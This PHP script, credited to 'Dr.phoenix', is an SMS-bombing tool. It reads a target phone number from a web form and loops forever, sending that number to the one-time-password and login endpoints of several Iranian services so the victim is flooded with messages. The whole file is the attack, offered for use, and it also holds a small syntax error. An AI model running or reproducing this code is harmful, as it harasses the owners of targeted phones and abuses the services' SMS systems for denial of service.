<?php
set_time_limit(1000);
if (isset($_POST['Target_phone_number'])) {
	$target = $_POST['Target_phone_number'];
	echo "<center><h1> Attack Started... </center></h1>";
	echo ""
	echo "<center><h2>
Coded by Dr.phoenix 
</h2></center>";
	while (True) {
		$url = 'https://api.snapp.ir/api/v1/sms/link';
		$ch = curl_init($url);
		$payload = '{"phone":"0'.$target.'"}';
		curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$result = curl_exec($ch);
		curl_close($ch);
		//snap link
		$url2 = 'https://tap33.me/api/v2/user';
		// Create a new cURL resource
		$ch2 = curl_init($url2);
		// Setup request to send json via POST
		$payload2 = '{"credential":{"phoneNumber":"0'.$target.'","role":"PASSENGER"}}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch2, CURLOPT_POSTFIELDS, $payload2);
		// Set the content type to application/json
		curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result2 = curl_exec($ch2);
		// Close cURL resource
		curl_close($ch2);
		//AliBaba
		// API URL
		$url3 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
		// Create a new cURL resource
		$ch3 = curl_init($url3);
		// Setup request to send json via POST
		$payload3 = '{phoneNumber: "0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch3, CURLOPT_POSTFIELDS, $payload3);
		// Set the content type to application/json
		curl_setopt($ch3, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result3 = curl_exec($ch3);
		// Close cURL resource
		curl_close($ch3);
		$url5 = 'https://www.echarge.ir/m/login?length=19';
		$params5 = ['phoneNumber' => '0'.$target];
		$ch5 = curl_init($url5);
		$parameters5 = http_build_query($params5);
		curl_setopt($ch5, CURLOPT_POST, true);
		curl_setopt($ch5, CURLOPT_POSTFIELDS, $parameters5);
		curl_setopt($ch5, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch5);
		curl_close($ch5);
	}
}
?>